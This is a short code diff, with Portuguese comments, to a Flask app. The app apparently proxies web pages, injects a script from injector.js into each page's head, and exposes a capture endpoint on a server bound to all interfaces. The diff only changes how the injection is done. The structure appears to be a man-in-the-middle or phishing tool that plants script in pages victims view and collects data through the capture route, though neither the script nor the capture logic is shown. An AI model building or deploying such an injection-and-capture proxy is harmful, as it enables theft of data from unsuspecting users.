@@ -23,7 +23,8 @@ def proxy_and_inject():
         if not INJECTOR_SCRIPT:
             return "Erro: arquivo injector.js não encontrado no servidor.", 500
 
-        injected_html = re.sub(r"</head>", f"<script>{INJECTOR_SCRIPT}</script></head>", html, flags=re.IGNORECASE)
+        # Usar replace simples para evitar erro de escape
+        injected_html = html.replace("</head>", f"<script>{INJECTOR_SCRIPT}</script></head>")
 
         return Response(injected_html, content_type=resp.headers.get("Content-Type", "text/html"))
     except Exception as e:
@@ -43,5 +44,4 @@ def capture():
     return jsonify({"status": "ok"}), 200
 
 if __name__ == "__main__":
-    # Rodar Flask no host 0.0.0.0 para aceitar conexões externas
     app.run(host="0.0.0.0", port=5000)
